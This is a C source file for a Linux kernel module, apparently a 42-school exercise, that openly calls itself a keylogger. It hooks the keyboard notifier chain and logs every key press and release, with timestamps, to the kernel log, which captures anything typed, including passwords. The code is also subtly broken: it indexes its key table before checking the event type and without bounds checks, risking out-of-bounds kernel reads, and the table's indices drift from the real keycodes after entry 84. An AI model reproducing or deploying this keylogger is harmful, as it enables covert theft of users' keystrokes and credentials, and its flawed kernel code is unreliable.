#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/printk.h>
#include <linux/timekeeping.h>
#include <linux/time.h>

struct s_key {
	uint64_t	keycode;
	char		*name;
	char		ascii;
};

static const struct s_key keys[] = {
	{0, "Nothing", '\0'},
	{1, "Escape", '\033'},
	{2, "one", '1'},
	{3, "two", '2'},
	{4, "three", '3'},
	{5, "four", '4'},
	{6, "five", '5'},
	{7, "six", '6'},
	{8, "seven", '7'},
	{9, "eight", '8'},
	{10, "nine", '9'},
	{11, "zero", '0'},
	{12, "bracketleft", '['},
	{13, "bracketright", ']'},
	{14, "Delete", '\177'},
	{15, "Tab", '\t'},
	{16, "apostrophe", '\''},
	{17, "comma", ','},
	{18, "period", '.'},
	{19, "p", 'p'},
	{20, "y", 'y'},
	{21, "f", 'f'},
	{22, "g", 'g'},
	{23, "c", 'c'},
	{24, "r", 'r'},
	{25, "l", 'l'},
	{26, "slash", '/'},
	{27, "equal", '='},
	{28, "Return", '\r'},
	{29, "Control", '\0'},
	{30, "a", 'a'},
	{31, "o", 'o'},
	{32, "e", 'e'},
	{33, "u", 'u'},
	{34, "i", 'i'},
	{35, "d", 'd'},
	{36, "h", 'h'},
	{37, "t", 't'},
	{38, "n", 'n'},
	{39, "s", 's'},
	{40, "minus", '-'},
	{41, "grave", '`'},
	{42, "Shift", '\0'},
	{43, "backslash", '\\'},
	{44, "semicolon", ';'},
	{45, "q", 'q'},
	{46, "j", 'j'},
	{47, "k", 'k'},
	{48, "x", 'x'},
	{49, "b", 'b'},
	{50, "m", 'm'},
	{51, "w", 'w'},
	{52, "v", 'v'},
	{53, "z", 'z'},
	{54, "Shift", '\0'},
	{55, "KP_Multiply", '\0'},
	{56, "Alt", '\0'},
	{57, "space", ' '},
	{58, "Caps_Lock", '\0'},
	{59, "F1", '\0'},
	{60, "F2", '\0'},
	{61, "F3", '\0'},
	{62, "F4", '\0'},
	{63, "F5", '\0'},
	{64, "F6", '\0'},
	{65, "F7", '\0'},
	{66, "F8", '\0'},
	{67, "F9", '\0'},
	{68, "F10", '\0'},
	{69, "Num_Lock", '\0'},
	{70, "Scroll_Lock", '\0'},
	{71, "KP_7", '\0'},
	{72, "KP_8", '\0'},
	{73, "KP_9", '\0'},
	{74, "KP_Subtract", '\0'},
	{75, "KP_4", '\0'},
	{76, "KP_5", '\0'},
	{77, "KP_6", '\0'},
	{78, "KP_Add", '\0'},
	{79, "KP_1", '\0'},
	{80, "KP_2", '\0'},
	{81, "KP_3", '\0'},
	{82, "KP_0", '\0'},
	{83, "KP_Period", '\0'},
	{84, "Last_Console", '\0'},
	{86, "less", '\0'},
	{87, "F11", '\0'},
	{88, "F12", '\0'},
	{96, "KP_Enter", '\0'},
	{97, "Control", '\0'},
	{98, "KP_Divide", '\0'},
	{99, "Compose", '\0'},
	{100, "AltGr", '\0'},
	{101, "Break", '\0'},
	{102, "Find", '\0'},
	{103, "Up", '\0'},
	{104, "Prior", '\0'},
	{105, "Left", '\0'},
	{106, "Right", '\0'},
	{107, "Select", '\0'},
	{108, "Down", '\0'},
	{109, "Next", '\0'},
	{110, "Insert", '\0'},
	{111, "Remove", '\0'},
	{112, "Macro", '\0'},
	{113, "F13", '\0'},
	{114, "F14", '\0'},
	{115, "Help", '\0'},
	{116, "Do", '\0'},
	{117, "F17", '\0'},
	{118, "KP_MinPlus", '\0'},
	{119, "Pause", '\0'},
};

static int	keyboard_event(struct notifier_block *nb, unsigned long action, void *data)
{
	struct keyboard_notifier_param	*param = data;
	struct s_key			key = keys[param->value];
	struct timespec64		ts;
	struct tm			tm;

	if (action != KBD_KEYCODE)
		return NOTIFY_OK;
	ktime_get_real_ts64(&ts);
	time64_to_tm(ts.tv_sec, 0, &tm);
	pr_info("%02d:%02d:%02d %s (%llu) %s\n", 
			tm.tm_hour,
			tm.tm_min,
			tm.tm_sec,
			key.name, 
			key.keycode, 
			param->down ? "pressed" : "released");
	return NOTIFY_OK;
}

static struct notifier_block	keyboard_nb = {
	.notifier_call = keyboard_event,
};

static int __init dni_init(void)
{
	pr_info("hi from the 42 keylogger\n");
	register_keyboard_notifier(&keyboard_nb);
	return 0;
}

static void __exit dni_exit(void)
{
	unregister_keyboard_notifier(&keyboard_nb);
	pr_info("by from the 42 keylogger\n");
}

module_init(dni_init);
module_exit(dni_exit);

MODULE_LICENSE("GPL");
